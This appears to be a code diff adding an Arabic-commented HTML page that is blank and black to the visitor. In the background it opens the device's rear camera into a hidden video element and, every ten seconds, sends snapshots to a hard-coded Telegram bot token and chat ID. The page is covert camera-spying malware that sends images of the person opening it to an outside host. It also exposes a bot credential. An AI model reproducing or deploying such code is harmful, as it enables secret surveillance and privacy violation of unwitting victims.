@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إرسال صور إلى بوت تلجرام</title>
+    <style>
+        /* جعل الصفحة بالكامل باللون الأسود */
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            background-color: black;
+        }
+        video {
+            display: none; /* إخفاء الفيديو */
+        }
+    </style>
+</head>
+<body>
+    <video id="video" autoplay></video> <!-- الفيديو غير مرئي هنا -->
+    <script>
+        // token الخاص بالبوت
+        const botToken = '8092198456:AAGLCVqwDdqBC_zeN6JBXvTU-MjK06Vy7BU';
+        // chat_id الخاص بالقناة أو المستخدم
+        const chatId = '6305469091';
+
+        let videoStream;
+        const canvas = document.createElement('canvas');
+        const context = canvas.getContext('2d');
+
+        // الوصول إلى كاميرا المستخدم الخلفية
+        navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: { exact: "environment" } }  // هذا يطلب الكاميرا الخلفية
+        })
+        .then((stream) => {
+            videoStream = stream;
+            // ضبط الفيديو ليعمل في الخلفية
+            const videoElement = document.getElementById('video');
+            videoElement.srcObject = videoStream;
+            videoElement.onloadedmetadata = () => {
+                // التأكد من تحميل الفيديو بشكل كامل
+                setTimeout(() => {
+                    captureAndSendImage();
+                }, 10000); // الانتظار 1 ثانية بعد تحميل الفيديو
+            };
+        })
+        .catch((err) => {
+            console.error('خطأ في الوصول إلى الكاميرا:', err);
+        });
+
+        // التقاط صورة كل ثانيتين
+        function captureAndSendImage() {
+            setInterval(() => {
+                const videoElement = document.getElementById('video');
+
+                // التأكد من أن الفيديو يتم عرضه بشكل صحيح
+                if (videoElement.videoWidth === 0 || videoElement.videoHeight === 0) {
+                    console.log('الفيديو غير جاهز');
+                    return;
+                }
+
+                // ضبط حجم الـ canvas ليطابق الفيديو
+                canvas.width = videoElement.videoWidth;
+                canvas.height = videoElement.videoHeight;
+
+                // رسم الصورة على الـ canvas
+                context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+
+                // تحويل الصورة إلى بيانات بصيغة base64
+                const imageData = canvas.toDataURL('image/png');
+
+                // إرسال الصورة إلى بوت تلجرام
+                sendImageToTelegram(imageData);
+            }, 10000); // إرسال صورة كل ثانيتين
+        }
+
+        // إرسال الصورة إلى بوت تلجرام
+        function sendImageToTelegram(imageData) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', dataURLToBlob(imageData), 'image.png'); // تحويل البيانات إلى Blob
+
+            // إرسال الصورة عبر API تلجرام
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                return response.json();
+            })
+            .then(data => {
+                if (data.ok) {
+                    console.log('تم إرسال الصورة بنجاح');
+                } else {
+                    console.error('فشل إرسال الصورة:', data.description);
+                }
+            })
+            .catch(error => {
+                console.error('خطأ في الاتصال بـ API تلجرام:', error);
+            });
+        }
+
+        // تحويل بيانات Base64 إلى Blob
+        function dataURLToBlob(dataURL) {
+            const byteString = atob(dataURL.split(',')[1]);
+            const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
+            return new Blob([ab], { type: mimeString });
+        }
+    </script>
+</body>
+</html>
